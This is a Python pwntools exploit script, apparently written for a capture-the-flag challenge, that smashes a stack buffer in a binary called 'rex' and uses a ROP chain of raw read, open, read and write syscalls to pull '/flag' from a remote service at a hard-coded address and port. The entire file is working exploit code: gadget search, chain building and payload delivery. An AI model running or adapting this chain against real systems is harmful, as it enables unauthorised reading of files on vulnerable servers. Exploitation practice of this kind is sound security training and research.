#!/usr/bin/env python3
# Exploit using direct syscalls (read/open/read/write) via ROP
# - requires: pop rax; ret, pop rdi; ret, pop rsi; ret, pop rdx; ret, syscall
# - usage: python3 exploit_syscall.py [--local] [--host HOST] [--port PORT] [--stderr]
#
from pwn import *
import argparse, sys, time, binascii

parser = argparse.ArgumentParser()
parser.add_argument("--local", action="store_true", help="Test locally")
parser.add_argument("--host", type=str, default="49.213.52.6")
parser.add_argument("--port", type=int, default=9996)
parser.add_argument("--bin", type=str, default="./rex")
parser.add_argument("--stderr", action="store_true", help="Write result to fd=2")
parser.add_argument("--debug", action="store_true", help="Debug logs")
args = parser.parse_args()

context.log_level = "debug" if args.debug else "info"
elf = context.binary = ELF(args.bin, checksec=False)

OFFSET = 72
BSS = elf.bss() + 0x800
BUF = BSS + 0x200
PATH = b"/flag\x00"
PATH_LEN = len(PATH)
READ_LEN = 0x200
OUT_FD = 2 if args.stderr else 1

# syscall numbers (x86_64)
SYS_read  = 0
SYS_write = 1
SYS_open  = 2    # open(path, flags, mode)
# On some systems open might be openat (259/257), we can detect and switch if needed.

# helper: find single-gadget pops
rop = ROP(elf)

def find_gadget(names):
    try:
        g = rop.find_gadget(names)
        if g: return g.address
    except Exception:
        pass
    return None

# try to find required gadgets
gad_pop_rax = find_gadget(['pop rax', 'pop rax; ret'])
gad_pop_rdi = find_gadget(['pop rdi', 'pop rdi; ret'])
gad_pop_rsi = find_gadget(['pop rsi', 'pop rsi; ret'])
# sometimes pop rdx is available as 'pop rdx; pop r12; ret', try flexible matches
gad_pop_rdx = find_gadget(['pop rdx', 'pop rdx; ret', 'pop rdx; pop r12; ret'])
gad_syscall = find_gadget(['syscall', 'syscall; ret'])

log.info("Gadget search results:")
log.info(" pop rax: %s", hex(gad_pop_rax) if gad_pop_rax else None)
log.info(" pop rdi: %s", hex(gad_pop_rdi) if gad_pop_rdi else None)
log.info(" pop rsi: %s", hex(gad_pop_rsi) if gad_pop_rsi else None)
log.info(" pop rdx: %s", hex(gad_pop_rdx) if gad_pop_rdx else None)
log.info(" syscall: %s", hex(gad_syscall) if gad_syscall else None)

# If any mandatory gadget missing, show a helpful message and exit (we could attempt ret2csu fallback)
missing = []
if not gad_pop_rax:
    missing.append('pop rax')
if not gad_pop_rdi:
    missing.append('pop rdi')
if not gad_pop_rsi:
    missing.append('pop rsi')
if not gad_pop_rdx:
    missing.append('pop rdx')
if not gad_syscall:
    missing.append('syscall')

if missing:
    log.error("Missing required gadgets: %s", missing)
    log.error("Fallback options:\n - Try ret2csu-based call into libc GOT/PLT (if read/write available)\n - Build syscall via mov/xchg or use a small inline shellcode (if NX disabled)\n")
    sys.exit(1)

# helper to build a syscall ROP: set rax, rdi, rsi, rdx then syscall
def syscall(rax, rdi, rsi, rdx):
    chain = b''
    chain += p64(gad_pop_rax) + p64(rax)
    chain += p64(gad_pop_rdi) + p64(rdi)
    chain += p64(gad_pop_rsi) + p64(rsi)
    chain += p64(gad_pop_rdx) + p64(rdx)
    chain += p64(gad_syscall)
    return chain

# Build chain:
# 1) read(0, BSS, PATH_LEN)  -> stage path into memory
# 2) open(BSS, 0, 0)         -> open the file, returns fd in RAX
# 3) read(fd, BUF, READ_LEN) -> read file content
# 4) write(OUT_FD, BUF, READ_LEN) -> write out content

chain = b''
chain += syscall(SYS_read, 0, BSS, PATH_LEN)
# open: set rax=SYS_open, rdi=BSS, rsi=0, rdx=0
chain += syscall(SYS_open, BSS, 0, 0)   # careful: ordering parameters per helper (we use rax,rdi,rsi,rdx)
# after this syscall, return value in rax = fd
# we don't have a gadget to mov rax->rdi automatically; simplest: assume fd==3 (common),
# so use fd_guess = 3. If this fails, ret2csu is necessary to move rax into rdi.
fd_guess = 3
chain += syscall(SYS_read, fd_guess, BUF, READ_LEN)
chain += syscall(SYS_write, OUT_FD, BUF, READ_LEN)

payload = b"A" * OFFSET + chain

def run_exploit():
    if args.local:
        io = process(args.bin)
    else:
        io = remote(args.host, args.port, timeout=10)
        try:
            # try disable nagle
            io.sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        except Exception:
            pass

    # consume banner/prompt a bit
    try:
        print(io.recvtimeout(0.5))
    except Exception:
        pass

    log.info("Sending payload (len=%d)", len(payload))
    io.send(payload)
    time.sleep(0.05)
    log.info("Sending stage2 path bytes: %r", PATH)
    io.send(PATH)      # this fills BSS via read(0,bss,len)
    io.send(b"\n")
    # read response
    try:
        out = io.recvall(timeout=5)
    except Exception:
        try:
            out = io.recv(timeout=2) or b""
        except Exception:
            out = b""
    try:
        io.close()
    except:
        pass

    print("\n---- RAW OUTPUT ----\n")
    print(out.decode('latin-1',errors='ignore'))
    print("\n---- HEX ----\n")
    print(binascii.hexlify(out[:1024]))

if __name__ == "__main__":
    run_exploit()
